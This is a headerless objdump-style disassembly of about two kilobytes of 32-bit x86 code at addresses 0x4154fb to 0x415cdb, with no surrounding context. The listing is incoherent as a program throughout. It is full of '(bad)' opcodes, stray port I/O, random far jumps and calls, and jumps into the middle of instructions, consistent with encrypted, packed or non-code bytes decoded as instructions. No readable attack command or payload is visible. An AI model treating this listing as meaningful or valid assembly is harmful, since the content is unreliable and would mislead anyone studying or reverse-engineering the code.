  4154fb:	repz jg 0x415491
  4154fe:	inc    edx
  4154ff:	push   edi
  415500:	sbb    dh,BYTE PTR [ecx]
  415502:	neg    BYTE PTR [ecx]
  415504:	ins    DWORD PTR es:[edi],dx
  415505:	inc    edx
  415506:	jns    0x415575
  415508:	retf   
  415509:	lahf   
  41550a:	jmp    0x2c7179f
  41550f:	dec    esp
  415510:	dec    edx
  415511:	sbb    DWORD PTR [edx-0x71b2b9d5],0xd1f111f4
  41551b:	and    DWORD PTR [ecx-0x7d6d5a04],esi
  415521:	cmp    ah,al
  415523:	mov    bh,0xe
  415525:	mov    cl,BYTE PTR [ebp+0x2f167ef1]
  41552b:	out    0xf6,al
  41552d:	ins    BYTE PTR es:[edi],dx
  41552e:	ror    BYTE PTR ds:0x4b2f2dd1,0xa4
  415535:	outs   dx,BYTE PTR ds:[esi]
  415536:	mov    bl,0x81
  415538:	pop    eax
  415539:	fwait
  41553a:	xchg   al,cl
  41553c:	xchg   ebp,eax
  41553d:	sahf   
  41553e:	in     al,0x57
  415540:	mov    esp,DWORD PTR [ecx+0x573bf6a2]
  415546:	mov    bl,0xba
  415548:	cmc    
  415549:	fwait
  41554a:	mov    edx,DWORD PTR [ebp+0x15]
  41554d:	aas    
  41554e:	lods   al,BYTE PTR ds:[esi]
  41554f:	cmp    ebp,edx
  415551:	jecxz  0x4155c2
  415553:	dec    eax
  415554:	or     ch,ch
  415556:	ja     0x4154ec
  415558:	cdq    
  415559:	xor    al,0xce
  41555b:	sahf   
  41555c:	hlt    
  41555d:	pop    es
  41555e:	sbb    ecx,DWORD PTR [ebp+0x6c1c2750]
  415564:	in     al,0x7e
  415566:	jo     0x41556c
  415568:	sbb    DWORD PTR [ebx],eax
  41556a:	mov    bh,BYTE PTR [eax+0x1c]
  41556d:	sbb    esi,DWORD PTR [edi-0x12b34173]
  415573:	sub    DWORD PTR [ebx],ecx
  415575:	leave  
  415576:	cwde   
  415577:	mov    edx,0xf9b1d8a0
  41557c:	push   ds
  41557d:	mov    bl,0x7
  41557f:	inc    ecx
  415580:	mov    esp,0x41ce7361
  415585:	push   edx
  415586:	dec    edx
  415587:	push   esi
  415588:	mov    BYTE PTR [ebp-0x43431924],dh
  41558e:	imul   eax,eax,0xffffff92
  415591:	push   ds
  415592:	rcl    WORD PTR [edx-0x69a7c13f],0xe
  41559a:	js     0x415524
  41559c:	repz sub DWORD PTR [eax],ebp
  41559f:	sub    al,0xbf
  4155a1:	fwait
  4155a2:	hlt    
  4155a3:	fdivr  DWORD PTR ds:0x17a2b34
  4155a9:	stos   DWORD PTR es:[edi],eax
  4155aa:	pop    edi
  4155ab:	sti    
  4155ac:	dec    esi
  4155ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155ae:	loope  0x4155a0
  4155b0:	loope  0x41560f
  4155b2:	retf   
  4155b3:	popf   
  4155b4:	cmc    
  4155b5:	bound  esi,QWORD PTR [ebp-0x67293bed]
  4155bb:	or     al,0xa5
  4155bd:	stos   BYTE PTR es:[edi],al
  4155be:	popa   
  4155bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155c0:	inc    edx
  4155c1:	mov    al,0xe
  4155c3:	or     al,0x99
  4155c5:	idiv   al
  4155c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155c8:	cmp    DWORD PTR [eax],edx
  4155ca:	mov    dh,0xc6
  4155cc:	js     0x41557e
  4155ce:	jo     0x415601
  4155d0:	pop    edx
  4155d1:	lods   eax,DWORD PTR ds:[esi]
  4155d2:	pop    ebx
  4155d3:	aaa    
  4155d4:	mov    edi,0xc15ff3a2
  4155d9:	push   eax
  4155da:	stos   BYTE PTR es:[edi],al
  4155db:	(bad)  
  4155dc:	dec    esi
  4155dd:	gs dec esi
  4155df:	fcmovbe st,st(0)
  4155e1:	les    ecx,FWORD PTR [ecx-0x54]
  4155e4:	or     DWORD PTR [esi-0x61b6461a],esi
  4155ea:	outs   dx,BYTE PTR ds:[esi]
  4155eb:	push   0x12
  4155ed:	xchg   ch,ah
  4155ef:	les    ecx,FWORD PTR [eax+0x6b]
  4155f2:	mov    ds:0x72dfce6c,al
  4155f7:	xchg   edx,eax
  4155f8:	add    al,0xe2
  4155fa:	xchg   ebp,eax
  4155fb:	push   edi
  4155fc:	shl    DWORD PTR [esi+0x31],0xb3
  415600:	xor    dh,BYTE PTR [ecx]
  415602:	mov    ecx,0x2a5be679
  415607:	jmp    0x7b5:0x2cd8a950
  41560e:	test   eax,0xdca48b64
  415613:	call   0xb7aa957f
  415618:	popa   
  415619:	dec    ebp
  41561a:	mov    ecx,0x28b9a9e
  41561f:	call   0x72a4:0x5648adbc
  415626:	ss adc eax,0x9aaba0b
  41562c:	add    ecx,0x44
  41562f:	inc    ecx
  415630:	jle    0x4155d9
  415632:	pop    ecx
  415633:	mov    bl,0xd4
  415635:	adc    cl,ch
  415637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415639:	cmp    edi,0xc1378245
  41563f:	lods   eax,DWORD PTR ds:[esi]
  415640:	(bad)  
  415641:	aam    0x1b
  415643:	jnp    0x415660
  415645:	cmp    BYTE PTR [eax+eax*1-0x1eb0a4f3],ch
  41564c:	adc    eax,0x80e62481
  415651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415652:	dec    ebp
  415653:	iret   
  415654:	xchg   edx,eax
  415655:	sbb    al,0x45
  415657:	cmp    cl,BYTE PTR [ebp+eiz*4-0x199302ba]
  41565e:	(bad)  
  41565f:	dec    esi
  415660:	pop    edx
  415661:	mov    ch,0xa3
  415663:	(bad)  
  415664:	jae    0x415640
  415666:	push   ecx
  415667:	inc    eax
  415668:	mov    edi,0x78d8f539
  41566d:	in     al,0xc6
  41566f:	sub    eax,0x3426df7b
  415674:	push   ss
  415675:	or     DWORD PTR fs:0xe4c07d80,ecx
  41567c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41567d:	jg     0x4156ba
  41567f:	xchg   DWORD PTR [eax+0x4],esp
  415682:	aaa    
  415683:	mov    eax,0xb6b4d43f
  415688:	nop
  415689:	js     0x41562c
  41568b:	call   0x23d5a504
  415690:	sbb    dl,dl
  415692:	mov    edx,0x1dc7f0d5
  415697:	mov    al,ds:0x55db7845
  41569c:	jmp    0x4156f6
  41569e:	push   edx
  41569f:	mov    cl,0x8e
  4156a1:	jno    0x41567e
  4156a3:	stos   BYTE PTR es:[edi],al
  4156a4:	retf   
  4156a5:	adc    al,0xfe
  4156a7:	push   0xb15f2c67
  4156ac:	shl    cl,cl
  4156ae:	bound  edx,QWORD PTR [edi+edi*8-0x68]
  4156b2:	adc    al,0x22
  4156b4:	add    DWORD PTR [ecx+edx*8],ebp
  4156b7:	repz pop es
  4156b9:	adc    ch,bl
  4156bb:	sbb    dl,BYTE PTR [esi+0x15]
  4156be:	repnz mov ebx,0x912935db
  4156c4:	push   ecx
  4156c5:	pop    edi
  4156c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156c7:	pop    eax
  4156c8:	mov    ds:0xd9b0d98e,eax
  4156cd:	adc    BYTE PTR [ebx-0x26419846],ah
  4156d3:	mov    al,ds:0xa6b50e58
  4156d8:	cmc    
  4156d9:	dec    edx
  4156da:	imul   ebx,ebp,0xf3294d88
  4156e0:	mov    ecx,0x60875df1
  4156e5:	pop    eax
  4156e6:	loopne 0x4156bf
  4156e8:	sub    esp,esi
  4156ea:	outs   dx,DWORD PTR ds:[esi]
  4156eb:	loopne 0x415694
  4156ed:	push   cs
  4156ee:	inc    esi
  4156ef:	xor    al,0xc7
  4156f1:	or     eax,0x6769df7e
  4156f6:	jbe    0x4156fb
  4156f8:	add    ebp,DWORD PTR [ecx+0x1cd00cba]
  4156fe:	(bad)  
  4156ff:	xor    eax,ebp
  415701:	stc    
  415702:	jnp    0x4156aa
  415704:	loope  0x4156c2
  415706:	sbb    al,0xc4
  415708:	dec    ebx
  415709:	adc    ah,al
  41570b:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41570d:	js     0x4156cf
  41570f:	add    esp,ebx
  415711:	sub    esp,eax
  415713:	loop   0x415740
  415715:	jns    0x4156d2
  415717:	dec    edi
  415718:	ss leave 
  41571a:	mov    esi,0x64a93619
  41571f:	pop    eax
  415720:	inc    BYTE PTR [ebx]
  415722:	xchg   DWORD PTR [eax+0x2],ebx
  415725:	std    
  415726:	push   0x8478177e
  41572b:	inc    esp
  41572c:	cmp    ch,BYTE PTR [edx]
  41572e:	hlt    
  41572f:	mov    fs,eax
  415731:	mov    eax,0xa3f8c2ed
  415736:	mov    ebx,DWORD PTR [ebp-0x445dbce3]
  41573c:	daa    
  41573d:	fwait
  41573e:	cld    
  41573f:	mov    ah,0x39
  415741:	int    0x9
  415743:	and    al,0x30
  415745:	or     eax,0x3563596c
  41574a:	jl     0x4156d4
  41574c:	dec    edi
  41574d:	in     al,dx
  41574e:	adc    eax,0xa9168b51
  415753:	pop    ss
  415754:	mov    ch,bl
  415756:	add    ecx,0x81431658
  41575c:	mov    cl,0x89
  41575e:	jno    0x41579f
  415760:	inc    BYTE PTR [esi+0x6f]
  415763:	test   ebp,ebx
  415765:	ret    
  415766:	xor    DWORD PTR [edi+0xaf2754b],edi
  41576c:	xchg   BYTE PTR [edi-0x210f2e7c],dl
  415772:	repz mov eax,0x493f69e7
  415778:	out    dx,eax
  415779:	jne    0x41574d
  41577b:	dec    esp
  41577c:	jae    0x41571f
  41577e:	add    DWORD PTR [ebp-0x6e],esp
  415781:	mul    DWORD PTR [esi+0x37770a83]
  415787:	pop    esi
  415788:	sub    DWORD PTR [edi+esi*1+0x210db11d],0x6806c950
  415793:	(bad)  [ecx+0x578bf77a]
  415799:	fist   WORD PTR [edx+0x7f]
  41579c:	mov    dh,0x3f
  41579e:	xchg   edx,eax
  41579f:	push   ebp
  4157a0:	jb     0x41577f
  4157a2:	or     ah,BYTE PTR [ecx+ecx*8-0x4e]
  4157a6:	fsubr  QWORD PTR [ecx]
  4157a8:	mov    dh,0xb2
  4157aa:	(bad)  
  4157ac:	clc    
  4157ad:	cmp    esp,DWORD PTR [esi]
  4157af:	dec    esi
  4157b0:	push   ecx
  4157b1:	mov    al,ds:0xa07a61c7
  4157b6:	jb     0x41575f
  4157b8:	pop    ebp
  4157b9:	mov    ebp,0x8cbe062f
  4157be:	stc    
  4157bf:	inc    DWORD PTR [ecx+0x6858f743]
  4157c5:	inc    edi
  4157c6:	loop   0x41577a
  4157c8:	mov    ah,0x37
  4157ca:	mov    WORD PTR [edi+0x3eb5aa60],?
  4157d0:	cli    
  4157d1:	add    ebx,DWORD PTR [edi-0x10]
  4157d4:	stos   DWORD PTR es:[edi],eax
  4157d5:	fs rcl dh,0xc0
  4157d9:	js     0x41583d
  4157db:	jo     0x41584e
  4157dd:	xchg   ecx,eax
  4157de:	jmp    0xd570fbcb
  4157e3:	push   ss
  4157e4:	sub    BYTE PTR [eax],ch
  4157e6:	popa   
  4157e7:	adc    esp,ebx
  4157e9:	jae    0x415795
  4157eb:	sbb    esi,DWORD PTR [esi]
  4157ed:	sub    eax,0xd5879277
  4157f2:	sbb    eax,0x707c2163
  4157f7:	adc    DWORD PTR [ebp+0x28fe5a6],esi
  4157fd:	retf   
  4157fe:	test   eax,0x5166291
  415803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415804:	nop
  415805:	xchg   BYTE PTR [ebp+0x59],dl
  415808:	push   esp
  415809:	sub    BYTE PTR ds:0xaca73268,dh
  41580f:	cs inc edi
  415811:	adc    ch,BYTE PTR [ebp-0x32949ec5]
  415817:	sbb    ch,cl
  415819:	sub    al,0xee
  41581b:	lea    edx,[eax+edx*2-0x27]
  41581f:	and    esp,0x6f914c1e
  415825:	or     bh,dh
  415827:	call   0x43dd547a
  41582c:	cwde   
  41582d:	cli    
  41582e:	xor    DWORD PTR [edx+0x53c60b42],esi
  415834:	push   ebx
  415835:	pop    ds
  415836:	inc    esi
  415837:	xchg   ecx,eax
  415838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415839:	out    dx,al
  41583a:	jno    0x4158ae
  41583c:	test   DWORD PTR [edx],eax
  41583e:	in     eax,0xbc
  415840:	jge    0x4157fe
  415842:	nop
  415843:	sahf   
  415844:	jle    0x4158b1
  415846:	dec    esp
  415847:	fcmovnu st,st(3)
  415849:	push   ebp
  41584a:	cli    
  41584b:	pop    edx
  41584c:	sahf   
  41584d:	xor    eax,ecx
  41584f:	pop    es
  415850:	jle    0x41586f
  415852:	xor    al,0x9f
  415854:	push   es
  415855:	dec    ebx
  415856:	arpl   WORD PTR [ebp+esi*2-0x3288d854],sp
  41585d:	fwait
  41585e:	push   esp
  41585f:	inc    esi
  415860:	icebp  
  415861:	cli    
  415862:	and    al,0x2e
  415864:	adc    ebp,DWORD PTR [bp+si-0x69]
  415868:	out    0xf,eax
  41586a:	call   0x76331dcd
  41586f:	push   ebx
  415870:	rcl    DWORD PTR [eax],1
  415872:	mov    cl,0xb5
  415874:	ds popf 
  415876:	push   0xf7aad066
  41587b:	call   0x9a157d0b
  415880:	add    eax,0x81ba8765
  415885:	sbb    DWORD PTR [esi+0x7e],esi
  415888:	shl    ch,0x14
  41588b:	jo     0x415891
  41588d:	jb     0x4158da
  41588f:	cmp    DWORD PTR [eax+0x61],esp
  415892:	(bad)  
  415893:	pop    ss
  415894:	push   0xffffff88
  415896:	popa   
  415897:	cmp    cl,BYTE PTR [esi-0x4b4b4362]
  41589d:	ret    
  41589e:	xlat   BYTE PTR ds:[ebx]
  41589f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158a0:	or     eax,edi
  4158a2:	and    BYTE PTR [esi],bh
  4158a4:	shr    bh,cl
  4158a6:	jmp    0x8a7c:0xab7f503e
  4158ad:	adc    al,0x69
  4158af:	rcl    DWORD PTR [esi+0x64],0xeb
  4158b3:	or     ch,al
  4158b5:	iret   
  4158b6:	pop    esp
  4158b7:	mov    BYTE PTR [esi-0x47e4d50a],dl
  4158bd:	pop    ecx
  4158be:	mov    ds:0x5bd741cb,al
  4158c3:	push   ds
  4158c4:	std    
  4158c5:	cmp    al,0xe7
  4158c7:	idiv   BYTE PTR [ebx+0x611c31dc]
  4158cd:	mov    esi,0x1200dbf
  4158d2:	js     0x415914
  4158d4:	js     0x41594d
  4158d6:	loope  0x4158c6
  4158d8:	mov    ds:0x3815c541,al
  4158dd:	sbb    DWORD PTR [eax],edi
  4158df:	fsubr  QWORD PTR [eax-0x6f638255]
  4158e5:	rcr    DWORD PTR [ecx-0x46d045ce],cl
  4158eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158ec:	cmp    al,0x2d
  4158ee:	aam    0x89
  4158f0:	push   edx
  4158f1:	test   al,0x97
  4158f3:	test   DWORD PTR [eax+0x9],0x5311e3ab
  4158fa:	dec    ebx
  4158fb:	(bad)  
  4158fc:	rep ins BYTE PTR es:[edi],dx
  4158fe:	sbb    BYTE PTR [ecx+0x5b91beba],bl
  415904:	sbb    DWORD PTR [ebx],edx
  415906:	lods   al,BYTE PTR ds:[esi]
  415907:	sbb    DWORD PTR [ebp+0x386f12c],0x1119a885
  415911:	out    0x51,al
  415913:	test   BYTE PTR [edx],0x6e
  415916:	sub    DWORD PTR [eax-0x11],0x3
  41591a:	xchg   ecx,eax
  41591b:	rcl    DWORD PTR [edx+edi*8+0x6b625874],cl
  415922:	adc    eax,DWORD PTR [ebx+0x7e67880b]
  415928:	mov    bh,0x17
  41592a:	push   cs
  41592b:	add    al,0xec
  41592d:	icebp  
  41592e:	cmp    DWORD PTR [ecx+0x22d51d84],ebx
  415934:	iret   
  415935:	lea    esi,[ecx-0x53c9c4a9]
  41593b:	sbb    ebx,DWORD PTR [eax+0xe4b0bb3]
  415941:	loopne 0x4159c2
  415943:	and    bl,dh
  415945:	outs   dx,DWORD PTR ss:[esi]
  415947:	xor    ah,BYTE PTR [ebp+0x3ecbe393]
  41594d:	int3   
  41594e:	outs   dx,DWORD PTR ds:[esi]
  41594f:	(bad)  
  415950:	in     al,dx
  415951:	test   eax,edi
  415953:	std    
  415954:	inc    edx
  415955:	mov    ch,BYTE PTR [ebp-0x7d]
  415958:	in     al,0xe7
  41595a:	xchg   DWORD PTR [edi+0x6],ebx
  41595d:	mov    edi,0x60ff65f4
  415962:	jb     0x41594e
  415964:	jmp    0x15cf774f
  415969:	pusha  
  41596a:	daa    
  41596b:	fdivr  DWORD PTR [ecx+0x5c]
  41596e:	(bad)  
  41596f:	jecxz  0x4159c5
  415971:	sahf   
  415972:	ret    0xa751
  415975:	jno    0x4159d2
  415977:	mov    bl,0xa0
  415979:	pusha  
  41597a:	call   0xe782:0xe71b928d
  415981:	pop    ebp
  415982:	ror    BYTE PTR [ecx],cl
  415984:	xor    eax,0x27d90db6
  415989:	mov    cs,WORD PTR [ebp-0x20]
  41598c:	xchg   edi,eax
  41598d:	jmp    0x41598a
  41598f:	cli    
  415990:	jnp    0x41596d
  415992:	lods   al,BYTE PTR ds:[esi]
  415993:	arpl   WORD PTR [eax],sp
  415995:	xchg   ebp,eax
  415996:	jmp    0x18dc8dc9
  41599b:	in     al,0xa2
  41599d:	inc    ebx
  41599e:	or     BYTE PTR [ecx-0x1e],ah
  4159a1:	jmp    0xa262c2ee
  4159a6:	sub    DWORD PTR [eax+0x8],edx
  4159a9:	stc    
  4159aa:	adc    al,0xde
  4159ac:	ret    0x4b86
  4159af:	cmc    
  4159b0:	xor    dh,BYTE PTR [ebp-0xd47947e]
  4159b6:	inc    ebp
  4159b7:	ins    DWORD PTR es:[edi],dx
  4159b8:	inc    edx
  4159b9:	dec    eax
  4159ba:	push   edi
  4159bb:	and    DWORD PTR [ebx-0x39429381],edx
  4159c1:	jg     0x415a01
  4159c3:	retf   0xa395
  4159c6:	xchg   ebp,eax
  4159c7:	fldcw  WORD PTR [eax]
  4159c9:	test   BYTE PTR [ebx],0x6e
  4159cc:	in     eax,dx
  4159cd:	jmp    0x415a2c
  4159cf:	scas   eax,DWORD PTR es:[edi]
  4159d0:	imul   edx,DWORD PTR [ecx+ecx*8],0x575a9182
  4159d7:	jmp    0x8a13:0xad21750
  4159de:	test   BYTE PTR [bp+0xd],ch
  4159e2:	pop    edi
  4159e3:	inc    ebx
  4159e4:	imul   esi,DWORD PTR [ecx+0xb4341fd],0xae8c5ca4
  4159ee:	and    bl,ah
  4159f0:	mov    ebp,0x6714f449
  4159f5:	dec    DWORD PTR [ebx-0x548ff712]
  4159fb:	xchg   edx,eax
  4159fc:	ret    0x5eec
  4159ff:	dec    edx
  415a00:	add    eax,0x43140084
  415a05:	fsub   QWORD PTR ds:0x36100ce2
  415a0b:	cmp    BYTE PTR [ebx+0x420da9e5],cl
  415a11:	sub    BYTE PTR [ebp+0x18bb2043],ah
  415a17:	pusha  
  415a18:	mov    ds:0x75b0bcbe,eax
  415a1d:	in     al,dx
  415a1e:	jmp    0x4aabff28
  415a23:	in     al,0x9
  415a25:	out    dx,al
  415a26:	dec    edx
  415a27:	sahf   
  415a28:	and    al,0x90
  415a2a:	adc    eax,0x6d65bea3
  415a2f:	aam    0xb
  415a31:	add    ch,dh
  415a33:	ss xchg edx,eax
  415a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a36:	mov    ebx,0x82a6e6b7
  415a3b:	xor    BYTE PTR [edx+0x18dbbb08],al
  415a41:	adc    BYTE PTR [esi+0x59],cl
  415a44:	adc    ebx,ecx
  415a46:	shl    BYTE PTR [esp+edi*4-0x77],cl
  415a4a:	(bad)  
  415a4b:	out    0x40,eax
  415a4d:	popf   
  415a4e:	leave  
  415a4f:	pushf  
  415a50:	sbb    BYTE PTR [ecx-0x20],ah
  415a53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a54:	pop    esi
  415a55:	and    DWORD PTR ds:0xe3cb19ee,edi
  415a5b:	xchg   esp,eax
  415a5c:	shl    DWORD PTR [edx],cl
  415a5e:	add    bl,dl
  415a60:	aad    0x36
  415a62:	fist   DWORD PTR [ecx-0x7cfef0e5]
  415a68:	add    al,BYTE PTR [edi]
  415a6a:	jmp    0x29e:0x64f0db64
  415a71:	mov    esp,0x6327edd1
  415a76:	sbb    cl,cl
  415a78:	push   edx
  415a79:	adc    dl,BYTE PTR [edx+0x6]
  415a7c:	push   esi
  415a7d:	aam    0x2f
  415a7f:	fwait
  415a80:	add    DWORD PTR [ebp-0x3674a7b],0x42
  415a87:	cmp    bh,bh
  415a89:	imul   edx,esp,0x35636f68
  415a8f:	mov    es,WORD PTR [ecx-0x634873d8]
  415a95:	js     0x415aa1
  415a97:	fisub  WORD PTR [eax+eax*8]
  415a9a:	sub    al,0x73
  415a9c:	jmp    0x8aa06f1e
  415aa1:	mov    al,0x85
  415aa3:	aaa    
  415aa4:	neg    BYTE PTR [esi+0x19983fae]
  415aaa:	pop    ecx
  415aab:	and    DWORD PTR [esi],ebp
  415aad:	xchg   edi,eax
  415aae:	pop    ebx
  415aaf:	cdq    
  415ab0:	retf   
  415ab1:	mov    esi,0xee5f6d8f
  415ab6:	push   0x4b
  415ab8:	cmc    
  415ab9:	aad    0xb7
  415abb:	jnp    0x415af6
  415abd:	jae    0x415b19
  415abf:	sub    eax,0x40e8de2e
  415ac4:	inc    eax
  415ac5:	sahf   
  415ac6:	push   0xffffffcf
  415ac8:	lea    edi,[ecx-0x5499c3e0]
  415ace:	sub    al,0x10
  415ad0:	mov    edx,0xf6a534dd
  415ad5:	daa    
  415ad6:	mov    esp,0x759c63c4
  415adb:	in     al,dx
  415adc:	shr    ebp,1
  415ade:	add    BYTE PTR [edx-0x14],al
  415ae1:	xor    DWORD PTR [edi-0x1e7f00d5],ebx
  415ae7:	mov    bh,0x7c
  415ae9:	jecxz  0x415b17
  415aeb:	xchg   BYTE PTR [edx+0x6a],bl
  415aee:	inc    eax
  415aef:	test   DWORD PTR [esi],esi
  415af1:	out    dx,al
  415af2:	cmc    
  415af3:	rol    edi,0x35
  415af6:	xor    al,BYTE PTR [ebp+0x7e83f13b]
  415afc:	nop
  415afd:	sub    edi,ecx
  415aff:	leave  
  415b00:	das    
  415b01:	cmp    esi,esp
  415b03:	stos   BYTE PTR es:[edi],al
  415b04:	fstp   DWORD PTR [edx-0x4070612b]
  415b0a:	mov    ds:0xab53bb65,eax
  415b0f:	sub    BYTE PTR [eax],bh
  415b11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b13:	out    dx,eax
  415b14:	push   cs
  415b15:	adc    bh,al
  415b17:	pushf  
  415b18:	adc    ecx,DWORD PTR [esp+ebp*4+0x2c]
  415b1c:	fisttp WORD PTR [esi+0x7d9a27d8]
  415b22:	repz xor DWORD PTR [edx+0x107cb292],edi
  415b29:	repz xchg esi,eax
  415b2b:	call   0x3ae2646f
  415b30:	dec    ebp
  415b31:	jo     0x415b3a
  415b33:	dec    ebp
  415b34:	inc    esp
  415b35:	fwait
  415b36:	xchg   edi,eax
  415b37:	ins    BYTE PTR es:[edi],dx
  415b38:	ret    0xaea1
  415b3b:	setne  BYTE PTR [edx+ebx*4-0x52]
  415b40:	or     ebp,DWORD PTR [esi]
  415b42:	imul   edi,DWORD PTR [ecx],0x33
  415b45:	sbb    DWORD PTR [edx+0x5],eax
  415b48:	scas   al,BYTE PTR es:[edi]
  415b49:	imul   DWORD PTR [esi-0x76]
  415b4c:	mov    eax,0xc1b19682
  415b51:	jmp    FWORD PTR [edi-0x39ca4684]
  415b57:	mov    gs,WORD PTR [edx+0x3]
  415b5a:	fld    QWORD PTR [eax+0x6e06a5ff]
  415b60:	and    dl,BYTE PTR [edi+0x541780c1]
  415b66:	jmp    0xcb0173f0
  415b6b:	xchg   ebp,eax
  415b6c:	mov    ebp,0xf9564006
  415b71:	xor    edi,DWORD PTR [eax]
  415b73:	xor    al,0x83
  415b75:	adc    DWORD PTR [edx-0x68b036c5],ebx
  415b7b:	sti    
  415b7c:	mov    edi,DWORD PTR [edx*1+0xc325333]
  415b83:	adc    ah,BYTE PTR [ecx]
  415b85:	and    eax,eax
  415b87:	and    ch,bh
  415b89:	fdivr  QWORD PTR [ecx+eiz*1-0x10b12f86]
  415b90:	icebp  
  415b91:	loop   0x415bb0
  415b93:	imul   ebx,DWORD PTR [edx+0x42],0x3000abc3
  415b9a:	pop    esi
  415b9b:	icebp  
  415b9c:	adc    esi,edi
  415b9e:	inc    edi
  415b9f:	mov    ah,0xbe
  415ba1:	fs and eax,ebx
  415ba4:	inc    ebp
  415ba5:	lods   al,BYTE PTR ds:[esi]
  415ba6:	mov    edi,esp
  415ba8:	add    bh,cl
  415baa:	jg     0x415bbd
  415bac:	pushf  
  415bad:	add    DWORD PTR [edi],eax
  415baf:	sub    bl,bh
  415bb1:	inc    ebx
  415bb2:	ins    DWORD PTR es:[edi],dx
  415bb3:	pop    ebp
  415bb4:	mov    ecx,0xefc76fd9
  415bb9:	test   DWORD PTR [esi+0x7c],ecx
  415bbc:	cmp    al,0x5a
  415bbe:	sbb    eax,0x8944d611
  415bc3:	aad    0xff
  415bc5:	pop    ebx
  415bc6:	rol    al,1
  415bc8:	pop    ds
  415bc9:	push   esp
  415bca:	and    eax,0x186c385f
  415bcf:	push   cs
  415bd0:	jbe    0x415b5c
  415bd2:	jno    0x415bbb
  415bd4:	jl     0x415b68
  415bd6:	pop    ecx
  415bd7:	jl     0x415baa
  415bd9:	mov    dh,0x50
  415bdb:	pop    es
  415bdc:	clc    
  415bdd:	sbb    BYTE PTR [ebp+esi*1+0x75],bl
  415be1:	xor    BYTE PTR [eax],0x99
  415be4:	mov    edx,0xcb85ac80
  415be9:	nop
  415bea:	mov    DWORD PTR [edx+eiz*4-0x29],esi
  415bee:	sahf   
  415bef:	jae    0x415c16
  415bf1:	jmp    0x415c2e
  415bf3:	xor    eax,0x764e1089
  415bf8:	jp     0x415b95
  415bfa:	loopne 0x415c40
  415bfc:	mov    eax,ds:0x95ab77f7
  415c01:	mov    eax,ds:0xd2d264e5
  415c06:	into   
  415c07:	xor    ebp,DWORD PTR [edx+0x27]
  415c0a:	sti    
  415c0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c0c:	std    
  415c0d:	les    ebx,FWORD PTR [edi-0x3e]
  415c10:	out    0x40,eax
  415c12:	sbb    al,0xe2
  415c14:	lods   eax,DWORD PTR ds:[esi]
  415c15:	sti    
  415c16:	popf   
  415c17:	out    dx,al
  415c18:	enter  0x5b0,0x17
  415c1c:	popf   
  415c1d:	fcom   QWORD PTR [edx-0x544e8c8b]
  415c23:	inc    esi
  415c24:	jo     0x415baf
  415c26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c27:	adc    edx,DWORD PTR ds:0x72a2b2ee
  415c2d:	jecxz  0x415c8f
  415c2f:	cld    
  415c30:	inc    eax
  415c31:	js     0x415ca6
  415c33:	imul   ecx,DWORD PTR [ecx-0x5b],0xec77e26c
  415c3a:	sbb    al,0xca
  415c3c:	lods   eax,DWORD PTR ds:[esi]
  415c3d:	scas   eax,DWORD PTR es:[edi]
  415c3e:	sub    eax,0xeeace1e9
  415c43:	stc    
  415c44:	lea    esi,[edx]
  415c46:	jmp    0x41cf:0xe25e3d7
  415c4d:	xchg   ecx,eax
  415c4e:	loopne 0x415ca8
  415c50:	adc    al,0xe9
  415c52:	jo     0x415c32
  415c54:	cli    
  415c55:	iret   
  415c56:	adc    eax,0xd2dacb7d
  415c5b:	adc    al,0xe5
  415c5d:	xor    eax,0xcdd66d0b
  415c62:	(bad)  
  415c65:	scas   eax,DWORD PTR es:[edi]
  415c66:	mov    eax,0x9d8f4719
  415c6b:	test   BYTE PTR [ebx+0x4b27643a],ah
  415c71:	mov    esp,0xc9741a40
  415c76:	jb     0x415cd2
  415c78:	pop    esp
  415c79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c7a:	mov    ebp,0x38daeb8a
  415c7f:	imul   eax,DWORD PTR gs:[ebx+0x739f122],0x65
  415c87:	dec    edi
  415c88:	dec    ebx
  415c89:	xor    bl,dh
  415c8b:	dec    esi
  415c8c:	outs   dx,DWORD PTR ds:[esi]
  415c8d:	cld    
  415c8e:	out    0x83,eax
  415c90:	push   0x4b106d14
  415c95:	fs mov dl,0xdc
  415c98:	mov    bl,0xab
  415c9a:	mov    dh,0x7f
  415c9c:	or     eax,esi
  415c9e:	jmp    0x415d04
  415ca0:	mov    dh,0xf4
  415ca2:	(bad)  [eax]
  415ca4:	xor    BYTE PTR [eax-0x629344ac],cl
  415caa:	aad    0xf0
  415cac:	xchg   ecx,eax
  415cad:	pop    es
  415cae:	cmp    dl,BYTE PTR [eax-0x7f]
  415cb1:	out    0xf,al
  415cb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cb4:	push   es
  415cb5:	ins    BYTE PTR es:[edi],dx
  415cb6:	inc    esi
  415cb7:	inc    edi
  415cb8:	js     0x415cb3
  415cba:	je     0x415cad
  415cbc:	dec    edi
  415cbd:	jmp    DWORD PTR [ecx+0x36e0dfa8]
  415cc3:	xor    DWORD PTR [ecx-0x5],ebx
  415cc6:	push   ecx
  415cc7:	xor    eax,0xb2b16e03
  415ccc:	jl     0x415d03
  415cce:	outs   dx,BYTE PTR ds:[esi]
  415ccf:	sub    ecx,ebp
  415cd1:	xchg   DWORD PTR [esi+eax*2+0x3a],esi
  415cd5:	mov    ds,WORD PTR [ecx+ecx*4-0x4d]
  415cd9:	pusha  
  415cda:	push   ebp
  415cdb:	add    dl,0xbe
